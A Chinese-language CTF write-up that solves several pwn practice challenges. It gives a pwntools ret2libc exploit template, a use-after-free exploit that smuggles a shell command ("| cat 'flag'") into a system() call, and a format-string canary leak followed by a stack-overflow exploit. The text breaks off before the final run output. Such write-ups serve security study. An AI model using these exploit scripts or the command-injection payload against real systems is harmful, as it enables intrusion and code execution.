
# 攻防世界-PWN-高手进阶区-难度3到4-全部题解

## 目的

通过攻防世界的一些入门难度的题目来学习最基本的漏洞利用技巧，以及提高代码审计的能力。传送门：[<mark class="encrypted">323K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6Y4M7X3q4V1k6g2)9K6c8o6q4Q4y4f1c8Q4x3U0S2Z5N6s2c8H3M7#2)9K6b7g2)9J5c8W2)9J5c8X3q4V1N6$3!0J5L8r3c8Q4x3X3g2^5j5%4c8X3i4K6u0W2L8%4u0Y4i4K6u0W2j5$3&6Q4x3V1k6@1j5i4y4C8i4K6u0r3N6r3q4K6K9#2)9#2k6X3I4A6M7%4c8Q4x3@1k6@1P5i4m8W2i4K6y4p5M7s2N6F1i4K6t1$3L8Y4g2E0j5X3g2J5i4K6y4p5x3W2)9J5y4X3N6J5j5h3c8W2i4K6y4p5x3b7`.`.</mark> "<mark class="encrypted">911K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2k6s2N6G2M7X3I4V1i4K6u0W2P5r3y4@1k6W2)9J5k6h3!0J5k6#2)9J5k6h3y4F1i4K6u0r3N6r3q4K6K9#2)9J5c8Y4c8S2M7$3E0Q4y4h3k6D9K9i4y4@1i4K6y4r3N6s2W2H3k6g2)9K6c8s2m8%4L8W2)9J5y4X3&6#2L8h3u0W2M7W2)9K6c8o6u0Q4x3U0k6Y4M7X3q4V1k6g2)9K6c8o6p5`.</mark>")

## 脑图

总结可能用到的知识点：

![](upload/attach/202106/800468_PRYDPCNQ8PFHD8N.jpg)

## 脚本模板

放上我常用的做题模板：

```python
import sys
from pwn import *
from LibcSearcher import LibcSearcher
rv = lambda : io.recv()
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
se = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
sconnect = lambda : io.interactive()
context.log_level = "DEBUG"
pwn_file = './pwn7'
elf = ELF(pwn_file)
if len(sys.argv) < 2:
    IS_LOCAL = 1
    io = process(pwn_file)
else:
    IS_LOCAL = 0
    sys_argv = sys.argv[1].split(':')
    io = remote(sys_argv[0], int(sys_argv[1]))
#---------------------------------------------------------
payload = '1'+'\x00'*6+'\xFF\x00'
'''
if IS_LOCAL:
    gdb.attach(io,"break *0x8048824\nc")
    pause()
'''
se(payload)
puts_addr = u32(io.recv()[:4])
if IS_LOCAL:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    libc_base = printf_addr - libc.sym['printf']
    system_addr = libc_base + libc.sym['system']
else:
    libc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')
    libc_base = printf_addr - libc.sym['printf']
    system_addr = libc_base + libc.sym['system']
#or choose to use LibcSearcher
'''
libc=LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
'''
log.info('puts_addr: 0x%x'%puts_addr)
log.info('system_addr: 0x%x'%system_addr)
log.info('str_bin_sh: 0x%x'%str_bin_sh)
payload = 'A'*235+p32(system_addr)+p32(0xdeadbeef)+p32(str_bin_sh)
se(payload)
sconnect()
```

需要打服务器的时候直接加个参数就可以：

```bash
python exp.py 111.200.241.244:56070
```

## TASKS

### `pwn-200`

《CTF竞赛指南》上有详解。

### `pwn-100`

《CTF竞赛指南》上有详解。

### `time_formatter`

这个题目涉及的漏洞是悬空指针（dangling pointer）和UAF：

```c
__int64 sub_400F8F()
{
__int64 result; // rax
char s[16]; // [rsp+8h] [rbp-20h] BYREF
unsigned __int64 v2; // [rsp+18h] [rbp-10h]
v2 = __readfsqword(0x28u);
free_400C7E(FORMAT_BUF_HEAP); // double free
free_400C7E(time_zone_heap);
__printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
fflush(stdout);
fgets(s, 16, stdin);
result = 0LL;
if ( (s[0] & 0xDF) == 'Y' )
{
puts("OK, exiting.");
result = 1LL;
}
return result;
}
```

可以看到，指针在用户确定退出之前就已经`free`了，`free`之后也没有及时指向`NULL`。这导致我们可以重新申请`format_buf`指向的堆内存，然后给予其新的值。再来看看`show`部分的代码：

```c
__int64 sub_400EA3()
{
char command[2048]; // [rsp+8h] [rbp-810h] BYREF
unsigned __int64 v2; // [rsp+808h] [rbp-10h]
v2 = __readfsqword(0x28u);
if ( FORMAT_BUF_HEAP )
{
__snprintf_chk(command, 2048LL, 1LL, 2048LL, "/bin/date -d @%d +'%s'", TIME, FORMAT_BUF_HEAP);
__printf_chk(1LL, "Your formatted time is: ");
fflush(stdout);
if ( getenv("DEBUG") )
__fprintf_chk(stderr, 1LL, "Running command: %s\n", command);
setenv("TZ", time_zone_heap, 1);
system(command);
}
else
{
puts("You haven't specified a format!");
}
return 0LL;
}
```

可以看到如果设置了环境变量会有不少提示信息，我们这里设置一个临时变量：

```bash
export DEBUG=1
```

然后看到程序中有`system`函数，而且部分参数是我们提供的输入；我们应该想到这里可以用`'`闭合命令，然后用管道执行一个新的命令。程序的本意是想执行这样的一条命令：

```bash
date -d @1568880277 +"%Y-%m-%d %H:%M:%S"
2019-09-19 16:04:37
```

我们想要执行这样一个命令：

```bash
/bin/date -d @0 +'%y' | cat 'flag'
```

根据以上思路，利用悬空指针漏洞绕过检查找出flag的值：

```bash
dc@ubuntu:~/playground$ ./time_formatter
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: b
strdup(0x7fffffffd948) = 0x603420
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
free(0x603420)
free((nil))
Are you sure you want to exit (y/N)? n
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: %y' | cat 'flag
strdup(0x7fffffffd948) = 0x603420 # assert timeformat_buf == timezone
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is: Running command: /bin/date -d @0 +'%y' | cat 'flag'
flag{ABCD}
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> ^C
```

### `Mary_Morton`

拿到程序先看下信息：

```bash
dc@ubuntu:~/playground$ file 22e2d7579d2d4359a5a1735edddef631
22e2d7579d2d4359a5a1735edddef631: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
dc@ubuntu:~/playground$ pwn checksec 22e2d7579d2d4359a5a1735edddef631
[*] '/home/dc/playground/22e2d7579d2d4359a5a1735edddef631'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

我们需要绕过金丝雀，再看程序关键流程如下：

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
int v3; // [rsp+24h] [rbp-Ch] BYREF
unsigned __int64 v4; // [rsp+28h] [rbp-8h]
v4 = __readfsqword(0x28u);
sub_4009FF();
puts("Welcome to the battle ! ");
puts("[Great Fairy] level pwned ");
puts("Select your weapon ");
while ( 1 )
{
while ( 1 )
{
sub_4009DA();
__isoc99_scanf("%d", &v3);
if ( v3 != 2 )
break;
sub_4008EB();
}
if ( v3 == 3 )
{
puts("Bye ");
exit(0);
}
if ( v3 == 1 )
sub_400960();
else
puts("Wrong!");
}
}
unsigned int sub_4009FF()
{
setvbuf(stdin, 0LL, 1, 0LL);
setvbuf(stdout, 0LL, 2, 0LL);
return alarm(0x14u);
}
int sub_4009DA()
{
puts("1. Stack Bufferoverflow Bug ");
puts("2. Format String Bug ");
return puts("3. Exit the battle ");
}
```

非常友好的题目（骗新人入坑）

两个有漏洞的函数：

```c
unsigned __int64 sub_4008EB()
{
char buf[136]; // [rsp+0h] [rbp-90h] BYREF
unsigned __int64 v2; // [rsp+88h] [rbp-8h]
v2 = __readfsqword(0x28u);
memset(buf, 0, 0x80uLL);
read(0, buf, 0x7FuLL);
printf(buf);
return __readfsqword(0x28u) ^ v2;
}
unsigned __int64 sub_400960()
{
char buf[136]; // [rsp+0h] [rbp-90h] BYREF
unsigned __int64 v2; // [rsp+88h] [rbp-8h]
v2 = __readfsqword(0x28u);
memset(buf, 0, 0x80uLL);
read(0, buf, 0x100uLL);
printf("-> %s\n", buf);
return __readfsqword(0x28u) ^ v2;
}
```

第一个函数的`printf`函数的格式化字符串由用户控制，第二个函数可从一开始的定义看出`buf`的缓冲区最多只有`0x90`的大小，而程序却可以接受`0x100`大小的输入，这将导致栈溢出。

最终，随便点击函数列表中的函数，发现了`win`函数：

```c
int sub_4008DA()
{
return system("/bin/cat ./flag");
}
```

到此，漏洞利用的一个思路基本可表示为以下三步：

1. 利用字符串格式化漏洞获得程序的`canary`
2. 进入第二个函数，测算到`canary`的距离，将获得的`canary`部署在栈上
3. 控制返回地址为`cat flag`函数的地址

由以上几步做`exp`如下：

```python
from pwn import *
context.log_level = "DEBUG"
io = process('./22e2d7579d2d4359a5a1735edddef631')
io.recv()
io.send('2\n')
io.send('%23$p\n')
canary = int(io.recvline(),16)
log.info('canary == 0x%x' % canary)
io.recv()
io.send('1\n')
io.send('A'*0x88+p64(canary)+p64(0xdeadbeef)+p64(0x4008DA))
io.recv()
```

运行下：
